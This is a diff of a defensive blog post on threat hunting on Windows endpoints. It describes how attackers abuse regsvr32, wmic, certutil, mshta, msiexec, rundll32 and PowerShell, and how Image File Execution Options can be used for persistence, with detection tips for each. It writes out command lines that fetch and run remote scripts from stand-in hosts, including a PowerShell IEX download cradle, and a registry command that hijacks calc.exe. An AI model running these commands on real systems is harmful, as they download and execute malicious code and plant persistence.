@@ -1,7 +1,7 @@
 ---
 layout: post
 classes: wide
-title:  "Threat Hunting in Windows Endpoints - Part 1"
+title:  "Threat Hunting in Windows Endpoints"
 date:   2024-12-07 01:00:00 +0800
 --- 
 This post provides details on threat hunting in the machines running in Windows operating system.  
@@ -14,7 +14,7 @@ Threat hunting in a Windows environment involves the proactive search for indica
 
 In computing, regsvr32 (Microsoft Register Server) is a command-line utility in Microsoft Windows operating systems for registering and unregistering DLLs and ActiveX controls in the Windows Registry. Adversaries can still use Regsvr32.exe on Windows to download and execute files
 
-`regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll`
+`regSvr32 /s /n /u /i:http[:]//<URL/evil.sct scrobj.dll`
 
 `regsvr32` is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
 The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It does not have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.
@@ -65,7 +65,7 @@ Registry Path:
 
 WMIC shell is a windows utility that provide command line interface for WMI(Windows Management Instrumentation).This offers various administrative functions to query windows machines to get details such as system settings, process and also to execute scripts. Adversaries use this utility to download malicious payload to evade detections.
 
-`wmic os get /FORMAT:"http://evil/evil[.]xsl"`
+`wmic os get /FORMAT:"http://<URl>/evil[.]xsl"`
 XSL script (eXtensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL
 
 
@@ -74,7 +74,7 @@ display certification authority (CA) configuration information, configure Certif
 and verify certificates, key pairs, and certificate chains.
 Adversaries use this utility to download malicious payload to evade detections.
 
-`certutil -urlcache -split -f [http[:]//evil] evil[.]txt`
+`certutil -urlcache -split -f [http[:]//<URL>] evil[.]txt`
 `certutil -decode evil.txt evil.exe`
  decode option used to decode the disguised certificate.
 
@@ -90,7 +90,7 @@ Adversaries use this utility to download malicious payload to evade detections.
 
 HTML Application Files (HTA) files is basically a desktop application which is based on HTML format. HTA dynamics are done via java scripting or VB scripts. Malicious codes can be in HTA formats to evade detections. MSHTA.exe is a Windows utility to execute HTA files. Adversaries use his utilities to execute the malicious HTA files.
 
-`mshta.exe https[:]//evil/evil[.]hta`
+`mshta.exe https[:]//<URL>/evil[.]hta`
 `mshta evil[.]hta`
 
 <u>Detection:</u>
@@ -106,7 +106,7 @@ MSIEXEC.exe is a Windows installer utility to install MSI or MSP packages. Adver
 and execute malicious MSI files.
 
 `MSIEXEC /j m evil[.]msi`
-`msiexec /q /i http[:]//evil[.]msi`
+`msiexec /q /i http[:]//<URL>/evil[.]msi`
 
 <u>Detection:</u>
 - Look for MSIEXEC.exe prefetch files and Parsing the prefetch will provide the executed file
@@ -128,4 +128,59 @@ Adversaries use this techniques to evade AV or application blacklisting techniqu
 - Command execution and arguments passed to HH.exe using EDR solutions.
 - Suspicious process under the parent process HH.exe
 - Look for Windows event id 4688 and search this utility name as a keyword
+
+
+### **<u>Abusing Image File Execution Option</u>**
+
+Image File Execution Options (IFEO) are used for debugging. IFEO settings are stored in the Windows registry. This feature enables the developer to to attach a debugger to the known executables. Malwares can exploit this feature for its persistence. For example  by adding a debugger to the  known applications like calc.exe to execute malicious file named evil.exe, whenever the user opens calc.exe, evil.exe will be executed.
+
+`REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "C:/evil.exe"`
+
+<u>Detection:</u>
+  - Sweep all the executables under below mentioned registry path of Image File Execution Options and look for "debugger" key name.
+  
+`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
+
+
+### **<u>Living of the Land techniques - Security Evasion</u>**
+
+Living Off the Land techniques for exploitation are popular among both sophisticated and ecrime adversaries. 
+Adversaries predominantly may use below windows utilities to download any executables and bypass proxy  or application whitelisting solutions. These techniques reduces the likelihood of detection and may increase the required investigation time.
+
+Windows Utilities:
+- certutil
+- Regsvr32
+- MSHTA
+- Powershell
+- msiexec
+- wmic
+- rundll32.exe
+
+
+Usage :
+- mshta.exe https[:]//evil/evil[.]hta
+- mshta evil[.]hta
+- regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
+- MSIEXEC /j m evil[.]msi
+- msiexec /q /i http[:]//evil/evil[.]msi 
+- wmic os get /FORMAT:"http://evil/evil[.]xsl"
+- rundll3.exe \\evil\evil.dll,0
+- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop 
+ -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil/evil.sct');"
+rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject
+    ("script:https[:]//www[.]example[.]com/malicious.sct")" 
+- Using Powershell:Invoke-WebRequest -Uri $url -OutFile $output
+- Using Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output)
+- Using Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous
+
+
+<u>Detection:</u>
+- Look for these utilities prefetch files and Parsing the prefetch will provide the executed file  
+- Command execution and arguments passed to these utilities using EDR solutions
+- Look for the HTTP useragents with regsvr32,mshta,certuril in the network recorders or the proxy logs,
+Certutil, Windows Installer, 
+Powershell-Mozilla/5.0 (Windows NT; Windows NT 6.3; en-US) WindowsPowerShell/4.0
+- Look for suspicious process in the system with parent process as these utilities.
+- Look for event id 4688 and its process command argument to track these exceutable with the above syntax.
+
 
